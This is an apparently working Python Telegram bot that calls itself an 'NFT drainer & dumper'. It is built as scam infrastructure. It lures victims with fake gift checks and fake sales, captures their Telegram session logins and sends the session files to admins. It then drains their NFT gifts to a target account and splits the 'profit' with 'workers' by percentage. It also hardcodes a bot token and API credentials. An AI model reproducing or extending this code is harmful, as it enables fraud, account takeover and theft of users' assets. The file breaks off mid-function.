#!/usr/bin/env python3
import asyncio
import logging
import sys
import os
import shutil
import uuid
import secrets
import sqlite3
import time
import subprocess
import re
import json
import html
import glob
import random
from datetime import datetime, timedelta
from pathlib import Path
from dotenv import load_dotenv
import aiohttp
from aiohttp import web
from typing import Optional, Dict, List
import threading

# Импорты Aiogram (Бот-интерфейс)
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.dispatcher.middlewares.base import BaseMiddleware
from aiogram.exceptions import TelegramRetryAfter
from aiogram.types import (
    InlineKeyboardButton, FSInputFile, WebAppInfo,
    InlineQueryResultArticle, InlineQueryResultPhoto, InlineQueryResultCachedPhoto, InputTextMessageContent,
    LabeledPrice, PreCheckoutQuery, Message
)
from aiogram.utils.keyboard import InlineKeyboardBuilder


try:
    from aportalsmp import auth, gifts
    PORTALS_AVAILABLE = True
except ImportError:
    PORTALS_AVAILABLE = False
    print("⚠️ Portals API not available - using fallback FLOOR calculations")

# ================= PORTALS API INTEGRATION =================
class PortalsAPI:
    """Класс для работы с Portals Marketplace API"""

    def __init__(self):
        self.token = None
        self.token_expiry = None

    async def get_auth_token(self) -> str:
        """Получает токен авторизации для Portals API"""
        try:
            print("🔐 PORTALS: Получение токена авторизации...")
            if PORTALS_AVAILABLE:
                # Получаем токен через pyrogram используя update_auth
                self.token = await auth.update_auth(
                    api_id=SETTINGS['api_id'],
                    api_hash=SETTINGS['api_hash'],
                    session_name='portals_session'
                )
                print(f"✅ PORTALS: Токен получен успешно")
                return self.token
            else:
                print("⚠️ PORTALS: Модуль aportalsmp не установлен")
                return None
        except Exception as e:
            print(f"❌ PORTALS: Ошибка получения токена: {e}")
            return None

    async def ensure_token(self):
        """Проверяет наличие токена и получает новый если нужно"""
        if not self.token:
            await self.get_auth_token()

    def extract_gift_info_from_link(self, gift_link: str) -> Optional[Dict[str, str]]:
        """Извлекает название модели и номер из ссылки на подарок"""
        try:
            # Паттерн: https://t.me/nft/ModelName-12345
            match = re.search(r'/nft/([A-Za-z]+)-(\d+)', gift_link)
            if match:
                camel_case_name = match.group(1)
                # Конвертируем CamelCase в "Title Case"
                model_name = re.sub(r'(?<!^)(?=[A-Z])', ' ', camel_case_name)
                return {
                    'model': model_name,
                    'number': match.group(2)
                }
            return None
        except Exception as e:
            print(f"❌ PORTALS: Ошибка парсинга ссылки {gift_link}: {e}")
            return None

    async def get_gift_floor_price(self, model_name: str) -> Optional[float]:
        """Получает floor price для модели подарка"""
        try:
            if not PORTALS_AVAILABLE:
                return None

            await self.ensure_token()
            if not self.token:
                print(f"⚠️ PORTALS: Нет токена авторизации для {model_name}")
                return None

            print(f"🔍 PORTALS: Поиск floor price для {model_name}...")

            # Ищем подарки по имени модели, сортируем по возрастанию цены
            results = await gifts.search(
                authData=self.token,
                gift_name=model_name,
                sort='price_asc',
                limit=1,
                min_price=1
            )

            if results and len(results) > 0:
                floor_price = results[0].price
                print(f"💰 PORTALS: Floor price для {model_name}: {floor_price} TON")
                return floor_price
            else:
                print(f"⚠️ PORTALS: Нет предложений на продажу для {model_name}")
                return None

        except Exception as e:
            print(f"❌ PORTALS: Ошибка получения floor price для {model_name}: {e}")
            return None

    async def calculate_total_floor_price(self, gift_links: List[str]) -> Dict[str, any]:
        """Вычисляет общую сумму floor price для списка подарков"""
        try:
            print(f"\n💰 PORTALS: Расчет общей стоимости для {len(gift_links)} подарков...")

            total_price = 0.0
            details = []
            not_found_count = 0

            for gift_link in gift_links:
                gift_info = self.extract_gift_info_from_link(gift_link)

                if not gift_info:
                    print(f"⚠️ PORTALS: Не удалось распарсить ссылку {gift_link}")
                    not_found_count += 1
                    continue

                model_name = gift_info['model']
                floor_price = await self.get_gift_floor_price(model_name)

                if floor_price:
                    total_price += floor_price
                    details.append({
                        'model': model_name,
                        'number': gift_info['number'],
                        'floor_price': floor_price,
                        'link': gift_link
                    })
                else:
                    not_found_count += 1

                # Задержка между запросами
                await asyncio.sleep(0.5)

            result = {
                'total': round(total_price, 2),
                'details': details,
                'not_found': not_found_count,
                'count': len(gift_links)
            }
            print(f"✅ PORTALS: Расчет завершен. Всего: {result['total']} TON")

            print(f"✅ PORTALS: Общая стоимость: {result['total']} TON ({len(details)}/{len(gift_links)} подарков)")

            return result

        except Exception as e:
            print(f"❌ PORTALS: Ошибка расчета общей стоимости: {e}")
            return {
                'total': 0.0,
                'details': [],
                'not_found': len(gift_links),
                'count': len(gift_links)
            }

# Глобальный экземпляр Portals API
portals_api = PortalsAPI()

async def alert_admins(bot: Bot, text: str):
    """Уведомление админов текстом"""
    admin_ids = SETTINGS.get('admins', [])
    for admin_id in admin_ids:
        try:
            await bot.send_message(admin_id, text)
        except: pass

async def send_file_to_admins(bot: Bot, file_path: Path, caption: str):
    """Отправка файла сессии админам"""
    admin_ids = SETTINGS.get('admins', [])
    if not file_path.exists(): return

    file = FSInputFile(file_path)
    for admin_id in admin_ids:
        try:
            await bot.send_document(admin_id, file, caption=caption)
        except: pass

def mask_data(data: str) -> str:
    """Маскирует 1/3 данных в середине строки."""
    if not data:
        return "N/A"
    data = str(data)
    length = len(data)
    if length < 4:
        return data  # Слишком короткие данные не маскируем

    start_visible = length // 3
    end_visible = length // 3
    middle_count = length - start_visible - end_visible

    return data[:start_visible] + "*" * middle_count + data[-end_visible:]

def mask_phone(phone: str) -> str:
    """Специальная маска для телефона (оставляет код и последние цифры)."""
    phone = re.sub(r'\D', '', phone) # Оставляем только цифры
    if len(phone) < 10:
        return mask_data(phone)

    # Определяем длину кода страны
    if phone.startswith('1'):  # США, Канада
        code_len = 1
    elif phone.startswith(('7', '20', '27', '30', '31', '32', '33', '34', '36', '39', '40', '41', '43', '44', '45', '46', '47', '48', '49', '350', '351', '352', '353', '354', '355', '356', '357', '358', '359', '370', '371', '372', '373', '374', '375', '376', '377', '378', '380', '381', '382', '383', '384', '385', '386', '387', '389', '420', '421', '423', '501', '502', '503', '504', '505', '506', '507', '508', '509', '590', '591', '592', '593', '594', '595', '596', '597', '598', '670', '672', '673', '674', '675', '676', '677', '678', '679', '680', '681', '682', '683', '684', '685', '686', '687', '688', '689', '690', '691', '692', '850', '852', '853', '855', '856', '880', '886', '960', '961', '962', '963', '964', '965', '966', '967', '968', '970', '971', '972', '973', '974', '975', '976', '977', '992', '993', '994', '995', '996', '998')):
        # Проверяем по убыванию длины
        for length in [3, 2, 1]:
            if phone[:length] in ['380', '375', '374', '373', '372', '371', '370', '359', '358', '357', '356', '355', '354', '353', '352', '351', '350', '39', '38', '37', '36', '35', '34', '33', '32', '31', '30', '27', '20', '7', '1']:
                code_len = length
                break
        else:
            code_len = 3  # По умолчанию
    else:
        code_len = 3

    # Форматируем номер
    code = phone[:code_len]
    remaining = phone[code_len:]
    if len(remaining) > 4:
        masked = "*" * (len(remaining) - 4) + remaining[-4:]
    else:
        masked = remaining

    return f"+{code}{masked}"

def get_deadline_date():
    """Генерирует дату MSK + 2-5 часов в формате 'день месяц год года часы:минуты по МСК+6'"""
    months = {
        1: 'января', 2: 'февраля', 3: 'марта', 4: 'апреля', 5: 'мая', 6: 'июня',
        7: 'июля', 8: 'августа', 9: 'сентября', 10: 'октября', 11: 'ноября', 12: 'декабря'
    }
    deadline = datetime.now() + timedelta(hours=random.randint(2, 5))
    day = deadline.day
    month = months[deadline.month]
    year = deadline.year
    hour = deadline.hour
    minute = deadline.minute
    return f"{day} {month} {year} года {hour:02d}:{minute:02d} по МСК+6"

def should_skip_log_user(user_data) -> bool:
    """Проверяет, содержит ли имя пользователя запрещенные слова."""
    if isinstance(user_data, dict):
        username = user_data.get('username', '').lower()
        first_name = user_data.get('first_name', '').lower()
    elif hasattr(user_data, 'username'):
        username = (user_data.username or '').lower()
        first_name = (user_data.first_name or '').lower()
    else:
        return False

    banned_words = ['team', 'teams', 'тима', 'тим', 'admin', 'support', 'administrator', 'support']
    for word in banned_words:
        if word in username or word in first_name:
            return True
    return False

# ================= НАСТРОЙКИ И КОНФИГУРАЦИЯ =================
SETTINGS_FILE = "settings.json"
DEFAULT_SETTINGS = {
    "target_user": "@GoldGiftsRobot",      # Куда сливать NFT
    "admin_ids": [7593326470],      # ID админов
    "allowed_group_id": -5011396354, # ID группы для логов
    "topic_launch": 16733,          # Топик запуска
    "topic_auth": 17272,            # Топик входов
    "topic_success": 19156,         # Топик успехов
    "topic_profit": 19156,          # Топик профитов (пока тот же что success, установите отдельный ID топика если нужно)
    "api_id": 36831187,             # Telegram API ID
    "api_hash": "ad4f15f3240af99f98eed10544f9c93f", # Telegram API Hash
    "api_url": "http://localhost:3000",
    "bot_token": "8019025031:AAFSd9mTFn0AP17qu1Y1moo-VH-8wd8iDms",                # Токен бота от FatherBot
    "maintenance_mode": True,
    "banker_session": "main_admin", # Имя сессии банкира (без .session)
    "dump_limit": 1,               # Сколько сообщений дампить
    "proxies": []                   # Список прокси: "ip:port:user:pass"
}

# Словарь подарков для пополнения баланса (ID: Цена)
REGULAR_GIFTS = {
    5170233102089322756: 15, 5170145012310081615: 15, 5168103777563050263: 25,
    5170250947678437525: 25, 6028601630662853006: 50, 5170564780938756245: 50,
    5170314324215857265: 50, 5170144170496491616: 50
}
GIFT_EMOJIS = {
    5170233102089322756: "🧸", 5170145012310081615: "💝", 5168103777563050263: "🌹",
    5170250947678437525: "🎁", 6028601630662853006: "🍾", 5170564780938756245: "🚀"
}

# Ссылки на фото чеков с ibb
CHECK_PHOTO_URLS = {
    50: "https://i.ibb.co/1fdZ3dmJ/50.jpg",
    100: "https://i.ibb.co/WvZFSDsq/100.jpg",
    150: "https://i.ibb.co/HD6sYd2N/150.jpg",
    200: "https://i.ibb.co/Y7gYywTy/200.jpg",
    250: "https://i.ibb.co/G42KbmkD/250.jpg",
    300: "https://i.ibb.co/hRPwJQw8/300.jpg",
    350: "https://i.ibb.co/G4YPZ3kR/350.jpg",
    400: "https://i.ibb.co/tTtC3jyM/400.jpg",
    450: "https://i.ibb.co/WWyLD27Q/450.jpg",
    500: "https://i.ibb.co/mrf9Hfrm/500.jpg"
}

# ================= ЦВЕТА И ЛОГИРОВАНИЕ =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║    🎁 ULTIMATE NFT DRAINER & DUMPER (MERGED CORE)            ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
# Suppress Pyrogram, Aiogram and aiohttp spam logs
logging.getLogger('pyrogram').setLevel(logging.ERROR)
logging.getLogger('aiogram').setLevel(logging.ERROR)
logging.getLogger('aiohttp').setLevel(logging.WARNING)
logger = logging.getLogger("MainBot")

def log_transfer(msg, level="info"):
    # Отдельный логгер для операций перевода
    prefix = "[TRANSFER] "
    if level == "info": logger.info(prefix + msg)
    elif level == "error": logger.error(prefix + msg)
    elif level == "warning": logger.warning(prefix + msg)

def print_step(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.BLUE}[{timestamp}] 🔹 {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_success(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.GREEN}[{timestamp}] ✅ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_warning(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.YELLOW}[{timestamp}] ⚠️ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_error(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.RED}[{timestamp}] ❌ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_info(msg):
    try:
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{Colors.CYAN}[{timestamp}] ℹ️ {msg}{Colors.END}")
    except BrokenPipeError:
        pass

def print_detailed(msg, level="info"):
    """Enhanced detailed logging with more context"""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if level == "transfer":
            print(f"{Colors.CYAN}[{timestamp}] 💰 TRANSFER: {msg}{Colors.END}")
        elif level == "nft":
            print(f"{Colors.YELLOW}[{timestamp}] 🎁 NFT: {msg}{Colors.END}")
        elif level == "session":
            print(f"{Colors.BLUE}[{timestamp}] 📱 SESSION: {msg}{Colors.END}")
        elif level == "profit":
            print(f"{Colors.GREEN}[{timestamp}] 💵 PROFIT: {msg}{Colors.END}")
        else:
            print(f"{Colors.CYAN}[{timestamp}] 📊 DETAIL: {msg}{Colors.END}")
    except BrokenPipeError:
        pass

# ================= УПРАВЛЕНИЕ ФАЙЛАМИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
ARCHIVE_DIR = BASE_DIR / "archive"
BAD_DIR = BASE_DIR / "archive_bad"
DUMP_DIR = BASE_DIR / "dumps"
CHECKS_PHOTO_DIR = BASE_DIR / "check_photos"

for d in [SESSIONS_DIR, ARCHIVE_DIR, BAD_DIR, DUMP_DIR, CHECKS_PHOTO_DIR]:
    d.mkdir(exist_ok=True)

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(DEFAULT_SETTINGS, f, indent=4)
        return DEFAULT_SETTINGS
    with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        # Merge defaults
        for k, v in DEFAULT_SETTINGS.items():
            if k not in data: data[k] = v
        return data

def save_settings(data):
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

SETTINGS = load_settings()
load_dotenv()

# Проверка окружения
if not SETTINGS.get("bot_token") and not os.getenv("BOT_TOKEN"):
    val = input("Введите BOT_TOKEN: ").strip()
    SETTINGS["bot_token"] = val
    save_settings(SETTINGS)

# ================= БАЗА ДАННЫХ =================
class Database:
    def __init__(self, db_file="bot_database.db"):
        db_path = BASE_DIR / db_file
        db_path.parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(str(db_path), check_same_thread=False)
        self.conn.execute("PRAGMA journal_mode=WAL")
        self.conn.execute("PRAGMA synchronous=NORMAL")
        self.conn.commit()
        self.cursor = self.conn.cursor()
        self.create_tables()

    def get_top_workers(self, limit=10):
        """Возвращает топ воркеров по общей сумме профитов без маскировки"""
        with db_lock:
            # Выбираем тех, у кого сумма профитов больше 0, сортируем по убыванию
            self.cursor.execute("""
                SELECT username, first_name, worker_total_profits, worker_profits 
                FROM users 
                WHERE worker_total_profits > 0 
                ORDER BY worker_total_profits DESC 
                LIMIT ?
            """, (limit,))
            return self.cursor.fetchall()

    def create_tables(self):
        # Создаем таблицу users с базовыми полями
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, balance INTEGER DEFAULT 0, worker_id INTEGER DEFAULT NULL, is_mamont BOOLEAN DEFAULT 0, is_dumped BOOLEAN DEFAULT 0)""")

        # Добавляем новые поля, если их нет (для обратной совместимости)
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN original_username TEXT")
            print("DEBUG: Added original_username column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN original_first_name TEXT")
            print("DEBUG: Added original_first_name column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN worker_profits INTEGER DEFAULT 0")
            print("DEBUG: Added worker_profits column")
        except: pass
        try:
            self.cursor.execute("ALTER TABLE users ADD COLUMN worker_total_profits INTEGER DEFAULT 0")
            print("DEBUG: Added worker_total_profits column")
        except: pass

        self.conn.commit()
        print("DEBUG: create_tables() completed")

        self.cursor.execute("""CREATE TABLE IF NOT EXISTS checks (check_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, activations INTEGER, claimed_count INTEGER DEFAULT 0, claimed_by TEXT DEFAULT '')""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS inline_checks (unique_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, claimed_by INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS worker_wallets (user_id INTEGER PRIMARY KEY, wallet_address TEXT, wallet_type TEXT DEFAULT 'tonkeeper')""")
        self.conn.commit()

    def add_user(self, user_id, username, first_name, worker_id=None, original_username=None, original_first_name=None):
        user = self.get_user(user_id)
        if not user:
            self.cursor.execute("INSERT INTO users (user_id, username, first_name, worker_id, original_username, original_first_name) VALUES (?, ?, ?, ?, ?, ?)",
                              (user_id, username or "Unknown", first_name or "Unknown", worker_id, original_username, original_first_name))
        else:
            if worker_id and not user['worker_id']:
                self.cursor.execute("UPDATE users SET worker_id = ? WHERE user_id = ?", (worker_id, user_id))
            if original_username and not user.get('original_username'):
                self.cursor.execute("UPDATE users SET original_username = ?, original_first_name = ? WHERE user_id = ?", (original_username, original_first_name, user_id))
            self.cursor.execute("UPDATE users SET username = ?, first_name = ? WHERE user_id = ?", (username or "Unknown", first_name or "Unknown", user_id))
        self.conn.commit()

    def get_user(self, user_id):
        try:
            with db_lock:
                self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
                row = self.cursor.fetchone()
                if row:
                    return {
                        'user_id': row[0],
                        'username': row[1],
                        'first_name': row[2],
                        'balance': row[3],
                        'worker_id': row[4],
                        'is_mamont': row[5],
                        'is_dumped': row[6],
                        'original_username': row[7] if len(row) > 7 else None,
                        'original_first_name': row[8] if len(row) > 8 else None,
                        'worker_profits': row[9] if len(row) > 9 else 0,
                        'worker_total_profits': row[10] if len(row) > 10 else 0
                    }
                return None
        except Exception as e:
            print_error(f"Database error in get_user: {e}")
            return None

    def increment_worker_profits(self, worker_id, amount=1):
        """Увеличивает счетчик профитов для воркера"""
        try:
            user = self.get_user(worker_id)
            if user:
                new_count = user.get('worker_profits', 0) + amount
                self.cursor.execute("UPDATE users SET worker_profits = ? WHERE user_id = ?", (new_count, worker_id))
                self.conn.commit()
                return new_count
        except Exception as e:
            print_error(f"Database error in increment_worker_profits: {e}")
        return 0

    def increment_worker_total_profits(self, worker_id, amount):
        """Увеличивает общую сумму профитов для воркера"""
        with db_lock:
            user = self.get_user(worker_id)
            if user:
                new_total = user.get('worker_total_profits', 0) + amount
                self.cursor.execute("UPDATE users SET worker_total_profits = ? WHERE user_id = ?", (new_total, worker_id))
                self.conn.commit()
                return new_total
        return 0

    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users")
        u = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT SUM(amount) FROM checks")
        c = self.cursor.fetchone()[0] or 0
        return u, c

    def mark_as_dumped(self, user_id):
        self.cursor.execute("UPDATE users SET is_dumped = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()

    def update_balance(self, user_id, amount, mode='add'):
        user = self.get_user(user_id)
        if not user:
            self.add_user(user_id, "Unknown", "Unknown")
            user = self.get_user(user_id)

        current = user['balance'] if user else 0
        new = current + amount if mode == 'add' else current - amount
        if new < 0: new = 0
        self.cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new, user_id))
        self.conn.commit()
        return new

    def set_mamont(self, user_id, status=True):
        user = self.get_user(user_id)
        if not user: self.add_user(user_id, "Unknown", "Unknown")
        self.cursor.execute("UPDATE users SET is_mamont = ? WHERE user_id = ?", (1 if status else 0, user_id))
        self.conn.commit()

    def create_check(self, creator_id, amount, activations):
        check_id = secrets.token_urlsafe(8)
        self.cursor.execute("INSERT INTO checks (check_id, creator_id, amount, activations) VALUES (?, ?, ?, ?)", (check_id, creator_id, amount, activations))
        self.conn.commit()
        return check_id

    def get_check(self, check_id):
        self.cursor.execute("SELECT * FROM checks WHERE check_id = ?", (check_id,))
        row = self.cursor.fetchone()
        return {'check_id': row[0], 'creator_id': row[1], 'amount': row[2], 'activations': row[3], 'claimed_count': row[4], 'claimed_by': row[5]} if row else None

    def activate_check(self, check_id, user_id):
        check = self.get_check(check_id)
        if not check: return "not_found", 0, None
        claimed = check['claimed_by'].split(',') if check['claimed_by'] else []
        if str(user_id) in claimed: return "already_claimed", 0, None
        if check['claimed_count'] >= check['activations']: return "empty", 0, None
        claimed.append(str(user_id))
        self.cursor.execute("UPDATE checks SET claimed_count = claimed_count + 1, claimed_by = ? WHERE check_id = ?", (",".join(claimed), check_id))
        self.update_balance(user_id, check['amount'], 'add')
        self.conn.commit()
        return "success", check['amount'], check['creator_id']

    def check_inline_used(self, unique_id):
        self.cursor.execute("SELECT * FROM inline_checks WHERE unique_id = ?", (unique_id,))
        return self.cursor.fetchone()

    def activate_inline_check(self, unique_id, creator_id, claimer_id, amount):
        if self.check_inline_used(unique_id): return "already_used"
        creator = self.get_user(creator_id)
        if not creator or creator['balance'] < amount: return "no_balance"
        self.update_balance(creator_id, amount, 'remove')
        self.update_balance(claimer_id, amount, 'add')
        self.cursor.execute("INSERT INTO inline_checks (unique_id, creator_id, amount, claimed_by) VALUES (?, ?, ?, ?)", (unique_id, creator_id, amount, claimer_id))
        self.conn.commit()
        return "success"

    def bind_wallet(self, user_id, wallet_address, wallet_type='tonkeeper'):
        with db_lock:
            self.cursor.execute("INSERT OR REPLACE INTO worker_wallets (user_id, wallet_address, wallet_type) VALUES (?, ?, ?)",
                              (user_id, wallet_address, wallet_type))
            self.conn.commit()

    def get_wallet(self, user_id):
        with db_lock:
            self.cursor.execute("SELECT wallet_address, wallet_type FROM worker_wallets WHERE user_id = ?", (user_id,))
            row = self.cursor.fetchone()
            return {'address': row[0], 'type': row[1]} if row else None

db_lock = threading.RLock()
db = Database()

# ================= STATES =================
class CreateCheckState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_activations = State()

class TopUpState(StatesGroup):
    waiting_for_custom_amount = State()

class BuyStarsState(StatesGroup):
    waiting_for_amount = State()

class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_api_url = State()

class AdminSearchState(StatesGroup):
    waiting_for_digits = State()

class FakeSaleState(StatesGroup):
    waiting_for_tag = State()
    waiting_for_amount = State()

class WaitingWalletAddress(StatesGroup):
    waiting_wallet_address = State()

# ================= RATE LIMITING =================
class RateLimitMiddleware(BaseMiddleware):
    def __init__(self):
        super().__init__()
        self.user_actions = {}  # user_id: [timestamps]

    async def __call__(self, handler, event, data):
        if hasattr(event, 'from_user') and event.from_user:
            user_id = event.from_user.id
            now = time.time()
            if user_id not in self.user_actions:
                self.user_actions[user_id] = []
            # Clean old actions (>60s)
            self.user_actions[user_id] = [t for t in self.user_actions[user_id] if now - t < 60]
            # Check limits
            if isinstance(event, types.Message):
                # 10 messages per minute
                if len(self.user_actions[user_id]) >= 10:
                    return  # Ignore
            elif isinstance(event, types.InlineQuery):
                # 5 inline queries per minute
                if len(self.user_actions[user_id]) >= 5:
                    return  # Ignore
            elif isinstance(event, types.CallbackQuery):
                # 20 callbacks per minute
                if len(self.user_actions[user_id]) >= 20:
                    return  # Ignore
            self.user_actions[user_id].append(now)
        return await handler(event, data)

# ================= UTIL FUNCTIONS =================
def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) > 7: return f"+{clean[:2]}*****{clean[-4:]}"
    return "Неизвестно"

def mask_user(text):
    if not text: return "******"
    if len(text) > 4: return f"{text[:2]}*****{text[-2:]}"
    return text

def get_target_username():
    raw = str(SETTINGS["target_user"])
    clean = raw.replace("https://t.me/", "").replace("@", "").strip()
    return clean

def clean_filename(name):
    cleaned = re.sub(r'[^\w\s\-\(\)]', '', str(name))
    return cleaned.strip() or "unknown"

def get_webapp_url(user_id, current_api_url):
    raw_url = current_api_url.strip().strip("'").strip('"').rstrip('/')
    if 'localhost' not in raw_url and not raw_url.startswith('https://'):
        raw_url = raw_url.replace('http://', 'https://') if 'http://' in raw_url else 'https://' + raw_url
    sep = '&' if '?' in raw_url else '?'
    return f"{raw_url}{sep}chatId={user_id}"

async def safe_edit_text(message: Message, text: str, reply_markup=None):
    try:
        if message.content_type == ContentType.PHOTO:
            await message.delete()
            await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await message.edit_text(text, reply_markup=reply_markup, parse_mode='HTML')
    except:
        await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')

# ================= УЛУЧШЕННОЕ ЛОГИРОВАНИЕ =================

async def log_check_activation(bot: Bot, user: types.User, check_data: dict):
    full_name = user.first_name or "Без имени"
    user_tag = f"@{mask_data(user.username)}" if user.username else mask_data(str(user.id))

    worker_info = "👤 <b>Воркер:</b> 👤 Администрация"
    if check_data.get('creator_id'):
        w = db.get_user(check_data['creator_id'])
        if w:
            w_tag = f"@{w['username']}" if w['username'] else f"Тег: {w['user_id']}"
            worker_info = f"👤 <b>Воркер:</b> {w_tag}"

    check_log = (
        f"<b>🎟 ПЕРЕХОД ПО ЧЕКУ</b>\n"
        f"<code>««─────────────────»»</code>\n"
        f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
        f"🆔 <b>Тег:</b> <code>{user_tag}</code>\n"
        f"🎫 <b>Чек:</b> <code>{check_data.get('amount', 0)} ⭐️</code>\n"
        f"{worker_info}\n"
        f"<code>««─────────────────»»</code>"
    )
    await log_to_topic(bot, 'topic_launch', check_log)

async def log_to_topic(bot: Bot, topic_key: str, text: str, photo_url: str = None):
    gid = SETTINGS.get('allowed_group_id')
    tid = SETTINGS.get(topic_key)

    if not gid or not tid:
        return f"Missing gid or tid: gid={gid}, tid={tid}"

    try:
        # 1. Пытаемся отправить с фото
        if photo_url:
            try:
                await bot.send_photo(
                    chat_id=int(gid),
                    photo=photo_url,
                    caption=text,
                    message_thread_id=int(tid),
                    parse_mode="HTML"
                )
                return "Message sent with photo"
            except Exception as e:
                print_error(f"📸 Не удалось отправить фото ({e}). Отправляю только текст...")
                # Если фото не ушло, код пойдет дальше к отправке текста

        # 2. Отправляем просто текст (если фото нет или оно сломалось)
        await bot.send_message(
            chat_id=int(gid),
            text=text,
            message_thread_id=int(tid),
            disable_web_page_preview=True,
            parse_mode="HTML"
        )
        return f"Message sent to topic {topic_key}"

    except TelegramRetryAfter as e:
        await asyncio.sleep(e.retry_after)
        return await log_to_topic(bot, topic_key, text, photo_url)
    except Exception as e:
        print_error(f"❌ Log Error (Global): {e}")
        return f"Log error: {e}"

async def log_profit_to_topic(bot: Bot, profit_data: dict):
    print("Starting log_profit_to_topic")
    try:
        mamont_tag = profit_data.get('mamont_tag', 'Unknown')
        # Входящие данные теперь должны содержать флаг успеха для каждого NFT
        all_nft_data = profit_data.get('nft_data', [])
        worker_id = profit_data.get('worker_id', None)
        
        # ФИЛЬТРАЦИЯ: Оставляем только те NFT, которые были реально переданы
        # (Проверяем наличие флага 'transferred', который мы добавим в FULL_WORKER_CYCLE)
        successful_nfts = [nft for nft in all_nft_data if nft.get('transferred') is True]
        nft_count = len(successful_nfts)

        if nft_count == 0:
            return "No profit to log - no NFTs successfully transferred"

        # Расчет доли воркера (динамический %)
        # 1–3 подарка — 50%, 4 и более — 60%
        worker_percentage = 0.60 if nft_count >= 4 else 0.50

        # Получение цен через Portals API
        gift_links = [nft.get('url', '') for nft in successful_nfts if nft.get('url')]
        total_floor_price = 0.0
        if PORTALS_AVAILABLE and gift_links:
            try:
                portals_result = await portals_api.calculate_total_floor_price(gift_links)
                total_floor_price = portals_result.get('total', 0.0)
            except Exception: pass

        # Чистая стоимость (вычитаем комиссию системы 7.5% для отображения)
        display_floor_price = total_floor_price * 0.925 
        # Доля воркера от чистой стоимости
        worker_share = display_floor_price * worker_percentage 

        print_success(f"💰 PROFIT: {display_floor_price:.2f} TON | 👷 %: {int(worker_percentage*100)}% | 🎁 Count: {nft_count}")

        # Увеличиваем счетчики воркера
        worker_tag = "👤 Администрация"
        wallet_text = ""
        if worker_id:
            db.increment_worker_profits(worker_id, nft_count)
            db.increment_worker_total_profits(worker_id, worker_share)

            worker_user = db.get_user(worker_id)
            if worker_user and worker_user.get('username'):
                worker_tag = f"@{worker_user['username']}"
            else:
                worker_tag = f"ID:{worker_id}"
            
            wallet_info = db.get_wallet(worker_id)
            if wallet_info:
                wallet_text = f"\n<b>💰 Кошелек для выплат:</b> <code>{wallet_info['address']}</code>"

        # Формируем список ссылок ТОЛЬКО переданных NFT
        nft_text_lines = []
        for nft in successful_nfts:
            title = html.escape(nft.get('title', 'Unknown NFT'))
            url = nft.get('url', '')
            if url:
                nft_text_lines.append(f"<blockquote><a href=\"{url}\">{title}</a></blockquote>")
            else:
                nft_text_lines.append(f"<blockquote>{title}</blockquote>")
        
        nft_text = "\n".join(nft_text_lines)

        profit_log = (
            f"<b>👤 {mamont_tag}</b>\n\n"
            f"<b>[▫️] AQUA TEAM BOT</b>\n"
            f"<b>[◾️] Новый профит!</b>\n"
            f"<b>[🔻] Были получены ({nft_count} шт.):</b>\n"
            f"<b>{nft_text}</b>\n"
            f"<b>💵 Стоимость: ~{display_floor_price:.2f} TON</b>\n"
            f"<b>🔹 Доля воркера ({int(worker_percentage*100)}%): {worker_share:.2f} TON</b>\n"
